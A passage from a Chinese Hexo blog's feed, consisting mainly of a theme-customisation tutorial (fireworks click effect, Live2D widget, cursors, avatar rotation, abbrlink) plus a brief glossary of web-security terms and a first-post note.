function_">debounce</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        canvasEl.<span class="property">width</span> = <span class="number">2</span> * <span class="variable language_">window</span>.<span class="property">innerWidth</span>;</span><br><span class="line">        canvasEl.<span class="property">height</span> = <span class="number">2</span> * <span class="variable language_">window</span>.<span class="property">innerHeight</span>;</span><br><span class="line">        canvasEl.<span class="property">style</span>.<span class="property">width</span> = <span class="variable language_">window</span>.<span class="property">innerWidth</span> + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">        canvasEl.<span class="property">style</span>.<span class="property">height</span> = <span class="variable language_">window</span>.<span class="property">innerHeight</span> + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">        canvasEl.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>).<span class="title function_">scale</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    &#125;, <span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> render = <span class="title function_">anime</span>(&#123;</span><br><span class="line">        <span class="attr">duration</span>: <span class="title class_">Infinity</span>,</span><br><span class="line">        <span class="attr">update</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            ctx.<span class="title function_">clearRect</span>(<span class="number">0</span>, <span class="number">0</span>, canvasEl.<span class="property">width</span>, canvasEl.<span class="property">height</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(tap, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">target</span>.<span class="property">id</span> !== <span class="string">&quot;sidebar&quot;</span> &amp;&amp; e.<span class="property">target</span>.<span class="property">id</span> !== <span class="string">&quot;toggle-sidebar&quot;</span> &amp;&amp; e.<span class="property">target</span>.<span class="property">nodeName</span> !== <span class="string">&quot;A&quot;</span> &amp;&amp; e.<span class="property">target</span>.<span class="property">nodeName</span> !== <span class="string">&quot;IMG&quot;</span>) &#123;</span><br><span class="line">            render.<span class="title function_">play</span>();</span><br><span class="line">            <span class="title function_">updateCoords</span>(e);</span><br><span class="line">            <span class="title function_">animateParticules</span>(pointerX, pointerY);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">setCanvasSize</span>();</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;resize&quot;</span>, setCanvasSize, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后在主题目录下的layout\layout.ejs&#96;中加入代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;canvas class=&quot;fireworks&quot; style=&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot; &gt;&lt;/canvas&gt; </span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;https://cdn.jsdelivr.net/gh/wallleap/cdn/js/clickBom.js&quot;&gt;&lt;/script&gt;    //线上的烟花特效js文件</span><br></pre></td></tr></table></figure><p><strong>头像旋转+鼠标指针样式+文章中图片排列</strong></p><p>在hexo根目录下的source文件夹下新建css文件夹。创建custom-1.css文件，并加入如下代码:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-pseudo">:root</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* </span></span><br><span class="line"><span class="comment">       设置文章中的图片排列位置</span></span><br><span class="line"><span class="comment">       居左：0 auto 0 0（默认）</span></span><br><span class="line"><span class="comment">       居中：0 auto</span></span><br><span class="line"><span class="comment">       居右：0 0 0 auto</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="attr">--post-img-align</span>: <span class="number">0</span> auto;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* 鼠标样式 */</span></span><br><span class="line">   <span class="selector-tag">body</span> &#123;</span><br><span class="line">      <span class="attribute">cursor</span>: <span class="built_in">url</span>(<span class="string">https://cdn.jsdelivr.net/gh/kaix2301/pictures/img202201071208706.cur</span>), auto;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="selector-tag">a</span> &#123;</span><br><span class="line">      <span class="attribute">cursor</span>: <span class="built_in">url</span>(<span class="string">https://cdn.jsdelivr.net/gh/kaix2301/pictures/img202201071205091.cur</span>), auto <span class="meta">!important</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* 头像旋转 */</span></span><br><span class="line">   <span class="selector-class">.avatar-box</span> &#123;</span><br><span class="line">      <span class="selector-tag">img</span> &#123;</span><br><span class="line">         <span class="attribute">transition</span>: transform <span class="number">1.0s</span> ease-out;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="selector-tag">img</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">         <span class="attribute">transform</span>: <span class="built_in">rotateZ</span>(<span class="number">360deg</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="selector-class">.posts-expand</span> <span class="selector-class">.post-body</span> <span class="selector-tag">img</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">         <span class="attribute">transform</span>: initial;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-添加卡通人物"><a href="#1-添加卡通人物" class="headerlink" title="1.添加卡通人物"></a>1.添加卡通人物</h2><p>进入该项目地址<a class="link"   href="https://github.com/EYHN/hexo-helper-live2d" >点击此处<i class="fas fa-external-link-alt"></i></a></p><p>在博客根目录下输入命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure><p>然后下载你喜欢的模型，将 packagename 更换成模型名称，模型选择请<a class="link"   href="https://github.com/xiazeyu/live2d-widget-models" >点击此处<i class="fas fa-external-link-alt"></i></a>，各个模型的预览请<a class="link"   href="https://huaji8.top/post/live2d-plugin-2.0/" >查看原作者的博客<i class="fas fa-external-link-alt"></i></a>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install packagename</span><br></pre></td></tr></table></figure><p>打开博客目录下的 _config.yml 文件，添加代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"># Live2D</span><br><span class="line">## https://github.com/EYHN/hexo-helper-live2d</span><br><span class="line">live2d:</span><br><span class="line">  enable: true</span><br><span class="line">  # enable: false</span><br><span class="line">  scriptFrom: local # 默认</span><br><span class="line">  pluginRootPath: live2dw/ # 插件在站点上的根目录(相对路径)</span><br><span class="line">  pluginJsPath: lib/ # 脚本文件相对与插件根目录路径</span><br><span class="line">  pluginModelPath: assets/ # 模型文件相对与插件根目录路径</span><br><span class="line">  # scriptFrom: jsdelivr # jsdelivr CDN</span><br><span class="line">  # scriptFrom: unpkg # unpkg CDN</span><br><span class="line">  # scriptFrom: https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js # 你的自定义 url</span><br><span class="line">  tagMode: false # 标签模式, 是否仅替换 live2d tag标签而非插入到所有页面中</span><br><span class="line">  debug: false # 调试, 是否在控制台输出日志</span><br><span class="line">  model:</span><br><span class="line">    use: live2d-widget-model-shizuku # npm-module package name</span><br><span class="line">    # use: wanko # 博客根目录/live2d_models/ 下的目录名</span><br><span class="line">    # use: ./wives/wanko # 相对于博客根目录的路径</span><br><span class="line">    # use: https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json # 你的自定义 url</span><br><span class="line">    scale: 1</span><br><span class="line">    hHeadPos: 0.5</span><br><span class="line">    vHeadPos: 0.618</span><br><span class="line">  display:</span><br><span class="line">    superSample: 2</span><br><span class="line">    width: 150      #模型宽度</span><br><span class="line">    height: 300     #模型高度</span><br><span class="line">    position: left    #模型位置</span><br><span class="line">    hOffset: 130    #水平偏移</span><br><span class="line">    vOffset: -20     #垂直偏移</span><br><span class="line">  mobile:</span><br><span class="line">    show: true       #是否在手机端显示</span><br><span class="line">    scale: 0.5</span><br><span class="line">  react:</span><br><span class="line">    opacityDefault: 0.7</span><br><span class="line">    opacityOnHover: 0.2</span><br></pre></td></tr></table></figure><p>注意:**use: <u>live2d-widget-model-shizuku</u>**一定要改成你的模型名字！！！</p><p>然后保存即可。</p><h2 id="2-Hexo鼠标点击烟花爆炸效果"><a href="#2-Hexo鼠标点击烟花爆炸效果" class="headerlink" title="2.Hexo鼠标点击烟花爆炸效果"></a>2.Hexo鼠标点击烟花爆炸效果</h2><p>在 \themes\keep\source\js 目录下新建一个文件，命名为fireworks.js，里面写入以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;use strict&quot;;function updateCoords(e)&#123;pointerX=(e.clientX||e.touches[0].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[0].clientY-canvasEl.getBoundingClientRect().top&#125;function setParticuleDirection(e)&#123;var t=anime.random(0,360)*Math.PI/180,a=anime.random(50,180),n=[-1,1][anime.random(0,1)]*a;return&#123;x:e.x+n*Math.cos(t),y:e.y+n*Math.sin(t)&#125;&#125;function createParticule(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color=colors[anime.random(0,colors.length-1)],a.radius=anime.random(16,32),a.endPos=setParticuleDirection(a),a.draw=function()&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;function createCircle(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color=&quot;#F00&quot;,a.radius=0.1,a.alpha=0.5,a.lineWidth=6,a.draw=function()&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=1&#125;,a&#125;function renderParticule(e)&#123;for(var t=0;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;function animateParticules(e,t)&#123;for(var a=createCircle(e,t),n=[],i=0;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;targets:n,x:function(e)&#123;return e.endPos.x&#125;,y:function(e)&#123;return e.endPos.y&#125;,radius:0.1,duration:anime.random(1200,1800),easing:&quot;easeOutExpo&quot;,update:renderParticule&#125;).add(&#123;targets:a,radius:anime.random(80,160),lineWidth:0,alpha:&#123;value:0,easing:&quot;linear&quot;,duration:anime.random(600,800)&#125;,duration:anime.random(1200,1800),easing:&quot;easeOutExpo&quot;,update:renderParticule,offset:0&#125;)&#125;function debounce(e,t)&#123;var a;return function()&#123;var n=this,i=arguments;clearTimeout(a),a=setTimeout(function()&#123;e.apply(n,i)&#125;,t)&#125;&#125;var canvasEl=document.querySelector(&quot;.fireworks&quot;);if(canvasEl)&#123;var ctx=canvasEl.getContext(&quot;2d&quot;),numberOfParticules=30,pointerX=0,pointerY=0,tap=&quot;mousedown&quot;,colors=[&quot;#FF1461&quot;,&quot;#18FF92&quot;,&quot;#5A87FF&quot;,&quot;#FBF38C&quot;],setCanvasSize=debounce(function()&#123;canvasEl.width=2*window.innerWidth,canvasEl.height=2*window.innerHeight,canvasEl.style.width=window.innerWidth+&quot;px&quot;,canvasEl.style.height=window.innerHeight+&quot;px&quot;,canvasEl.getContext(&quot;2d&quot;).scale(2,2)&#125;,500),render=anime(&#123;duration:1/0,update:function()&#123;ctx.clearRect(0,0,canvasEl.width,canvasEl.height)&#125;&#125;);document.addEventListener(tap,function(e)&#123;&quot;sidebar&quot;!==e.target.id&amp;&amp;&quot;toggle-sidebar&quot;!==e.target.id&amp;&amp;&quot;A&quot;!==e.target.nodeName&amp;&amp;&quot;IMG&quot;!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!1),setCanvasSize(),window.addEventListener(&quot;resize&quot;,setCanvasSize,!1)&#125;&quot;use strict&quot;;function updateCoords(e)&#123;pointerX=(e.clientX||e.touches[0].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[0].clientY-canvasEl.getBoundingClientRect().top&#125;function setParticuleDirection(e)&#123;var t=anime.random(0,360)*Math.PI/180,a=anime.random(50,180),n=[-1,1][anime.random(0,1)]*a;return&#123;x:e.x+n*Math.cos(t),y:e.y+n*Math.sin(t)&#125;&#125;function createParticule(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color=colors[anime.random(0,colors.length-1)],a.radius=anime.random(16,32),a.endPos=setParticuleDirection(a),a.draw=function()&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;function createCircle(e,t)&#123;var a=&#123;&#125;;return a.x=e,a.y=t,a.color=&quot;#F00&quot;,a.radius=0.1,a.alpha=0.5,a.lineWidth=6,a.draw=function()&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,0,2*Math.PI,!0),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=1&#125;,a&#125;function renderParticule(e)&#123;for(var t=0;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;function animateParticules(e,t)&#123;for(var a=createCircle(e,t),n=[],i=0;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;targets:n,x:function(e)&#123;return e.endPos.x&#125;,y:function(e)&#123;return e.endPos.y&#125;,radius:0.1,duration:anime.random(1200,1800),easing:&quot;easeOutExpo&quot;,update:renderParticule&#125;).add(&#123;targets:a,radius:anime.random(80,160),lineWidth:0,alpha:&#123;value:0,easing:&quot;linear&quot;,duration:anime.random(600,800)&#125;,duration:anime.random(1200,1800),easing:&quot;easeOutExpo&quot;,update:renderParticule,offset:0&#125;)&#125;function debounce(e,t)&#123;var a;return function()&#123;var n=this,i=arguments;clearTimeout(a),a=setTimeout(function()&#123;e.apply(n,i)&#125;,t)&#125;&#125;var canvasEl=document.querySelector(&quot;.fireworks&quot;);if(canvasEl)&#123;var ctx=canvasEl.getContext(&quot;2d&quot;),numberOfParticules=30,pointerX=0,pointerY=0,tap=&quot;mousedown&quot;,colors=[&quot;#FF1461&quot;,&quot;#18FF92&quot;,&quot;#5A87FF&quot;,&quot;#FBF38C&quot;],setCanvasSize=debounce(function()&#123;canvasEl.width=2*window.innerWidth,canvasEl.height=2*window.innerHeight,canvasEl.style.width=window.innerWidth+&quot;px&quot;,canvasEl.style.height=window.innerHeight+&quot;px&quot;,canvasEl.getContext(&quot;2d&quot;).scale(2,2)&#125;,500),render=anime(&#123;duration:1/0,update:function()&#123;ctx.clearRect(0,0,canvasEl.width,canvasEl.height)&#125;&#125;);document.addEventListener(tap,function(e)&#123;&quot;sidebar&quot;!==e.target.id&amp;&amp;&quot;toggle-sidebar&quot;!==e.target.id&amp;&amp;&quot;A&quot;!==e.target.nodeName&amp;&amp;&quot;IMG&quot;!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!1),setCanvasSize(),window.addEventListener(&quot;resize&quot;,setCanvasSize,!1)&#125;;</span><br></pre></td></tr></table></figure><p>然后在<code>Hexo\themes\keep\layout\layout.ejs</code>中加入代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;canvas class=&quot;fireworks&quot; style=&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot; &gt;&lt;/canvas&gt; </span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;https://cdn.jsdelivr.net/gh/wallleap/cdn/js/clickBom.js&quot;&gt;&lt;/script&gt;    //线上的烟花特效js文件</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;/js/fireworks.js&quot;&gt;&lt;/script&gt;   //本地的烟花特效js文件</span><br></pre></td></tr></table></figure><h2 id="3-keep主题下头像旋转"><a href="#3-keep主题下头像旋转" class="headerlink" title="3.keep主题下头像旋转"></a>3.keep主题下头像旋转</h2><p>在博客根目录下themes\keep\source\css\layout\post-content.styl文件内的.avatar内加入如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">transition: transform 1.0s ease-out;//img内加入</span><br><span class="line"></span><br><span class="line">img:hover &#123;</span><br><span class="line">    transform: rotateZ(360deg);</span><br><span class="line">&#125;</span><br><span class="line">.posts-expand .post-body img:hover &#123;</span><br><span class="line">    transform: initial;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-设置博客文章持久化连接"><a href="#4-设置博客文章持久化连接" class="headerlink" title="4.设置博客文章持久化连接"></a>4.设置博客文章持久化连接</h2><p>安装 <code>hexo-abbrlink</code> 插件 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure><p>在博客根目录下的配置文件中添加如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># abbrlink config</span><br><span class="line">abbrlink:</span><br><span class="line">  alg: crc32      #support crc16(default) and crc32</span><br><span class="line">  rep: dec        #support dec(default) and hex</span><br><span class="line">  drafts: false   #(true)Process draft,(false)Do not process draft. false(default) </span><br><span class="line">  # Generate categories from directory-tree</span><br><span class="line">  # depth: the max_depth of directory-tree you want to generate, should &gt; 0</span><br><span class="line">  auto_category:</span><br><span class="line">     enable: true  #true(default)</span><br><span class="line">     depth:        #3(default)</span><br><span class="line">     over_write: false </span><br><span class="line">  auto_title: false #enable auto title, it can auto fill the title by path</span><br><span class="line">  auto_date: false #enable auto date, it can auto fill the date by time today</span><br><span class="line">  force: false #enable force mode,in this mode, the plugin will ignore the cache, and calc the abbrlink for every post even it already had abbrlink. This only updates abbrlink rather than other front variables.</span><br></pre></td></tr></table></figure><h2 id="5-设置鼠标指针样式"><a href="#5-设置鼠标指针样式" class="headerlink" title="5.设置鼠标指针样式"></a>5.设置鼠标指针样式</h2><p>在<code>Hexo\themes\keep\source\css</code>中，新建文件夹my，然后在文件夹中创建mouse.styl文件，粘贴以下代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">cursor: url(https://cdn.jsdelivr.net/gh/kaix2301/pictures/img202201071208706.cur), auto;</span><br><span class="line">&#125;</span><br><span class="line">a &#123;</span><br><span class="line">cursor: url(https://cdn.jsdelivr.net/gh/kaix2301/pictures/img202201071205091.cur), auto!important;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后打开<code>Hexo\themes\keep\source\css</code>中的style.styl文件，在里面添加引用<code>@import &quot;my/mouse.styl&quot;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;更新&quot;&gt;&lt;a href=&quot;#更新&quot; class=&quot;headerlink&quot; title=&quot;更新&quot;&gt;&lt;/a&gt;更新&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;利用inject注入美化主题，后续就可以平滑升级了&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;首先打开主题配置文件中的inject，并</summary>
      
    
    
    
    <category term="网站建设" scheme="https://idealyth.github.io/blog/categories/%E7%BD%91%E7%AB%99%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="hexo" scheme="https://idealyth.github.io/blog/tags/hexo/"/>
    
    <category term="美化" scheme="https://idealyth.github.io/blog/tags/%E7%BE%8E%E5%8C%96/"/>
    
    <category term="网站" scheme="https://idealyth.github.io/blog/tags/%E7%BD%91%E7%AB%99/"/>
    
  </entry>
  
  <entry>
    <title>web安全一些名词解释</title>
    <link href="https://idealyth.github.io/blog/posts/2301763326.html"/>
    <id>https://idealyth.github.io/blog/posts/2301763326.html</id>
    <published>2022-04-02T21:32:44.000Z</published>
    <updated>2025-01-03T05:44:08.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>CMS</strong>：是模板式的网站开发工具，直接套用模板开发网站，肯定包括后台管理系统，一套cms后台管理都挺类似的</p><p><strong>后台管理系统</strong>：可能是用某种语言写出来的一个管理网站的系统</p><p>转载自百度知道的一个解释：<br>但凡CMS，一定是有一套资深的网站后台管理系统的，功能强大的还能直接管理网站前端的一些功能。<br>但是网站后台管理系统不一定来源于CMS，也会有技术人员直接用PHP或者.net直接开发而成。<br>说白了就是CMS是半成品，网站后台管理系统是成品。所以二者的区别是，cms一定带有网站后台管理系统，但网站后台管理系统并不一定是CMS，有可能直接用语言写出来。</p><p><strong>后端</strong>：前端是写代码给浏览器看的。后端是写代码给服务器看的。后端就是一些应用程序，部署在web服务器上，前端通过这些后端应用程序来和数据库交互等。</p><p><strong>web服务器</strong>：就是一个容器，里面放着网站文件等</p><p>指服务器上运行着的一个软件，可以处理浏览器等Web客户端的请求并返回相应响应，也可以放置网站文件，让全世界浏览；可以放置数据文件，让全世界下载。目前最主流的三个Web服务器是Apache、 Nginx 、IIS。</p><p><strong>exp</strong> (Exploit )漏洞利用，一般是个demo程序</p><p><strong>poc</strong> (Proof of Concept)观点验证程序，一般就是个样本 用来证明和复现</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;CMS&lt;/strong&gt;：是模板式的网站开发工具，直接套用模板开发网站，肯定包括后台管理系统，一套cms后台管理都挺类似的&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;后台管理系统&lt;/strong&gt;：可能是用某种语言写出来的一个管理网站的系统&lt;/p&gt;
&lt;p&gt;转载自百度知道</summary>
      
    
    
    
    <category term="web安全学习" scheme="https://idealyth.github.io/blog/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web安全" scheme="https://idealyth.github.io/blog/tags/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="cms" scheme="https://idealyth.github.io/blog/tags/cms/"/>
    
    <category term="web服务器" scheme="https://idealyth.github.io/blog/tags/web%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>第一篇文章</title>
    <link href="https://idealyth.github.io/blog/posts/1546629063.html"/>
    <id>https://idealyth.github.io/blog/posts/1546629063.html</id>
    <published>2022-04-02T21:31:02.000Z</published>
    <updated>2025-01-03T05:44:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>忙活了一天终于搭建好博客了，我滴个天啊！！！ </p><p>冒号后面一定要加个空格！！！</p><p>啦啦啦啦啦啦啦</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;忙活了一天终于搭建好博客了，我滴个天啊！！！ &lt;/p&gt;
&lt;p&gt;冒号后面一定要加个空格！！！&lt;/p&gt;
&lt;p&gt;啦啦啦啦啦啦啦&lt;/p&gt;
</summary>
      
    
    
    
    <category term="网站建设" scheme="https://idealyth.github.io/blog/categories/%E7%BD%91%E7%AB%99%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="网站" scheme="https://idealyth.github.io/blog/tags/%E7%BD%91%E7%AB%99/"/>
    
  </entry>
  
</feed>
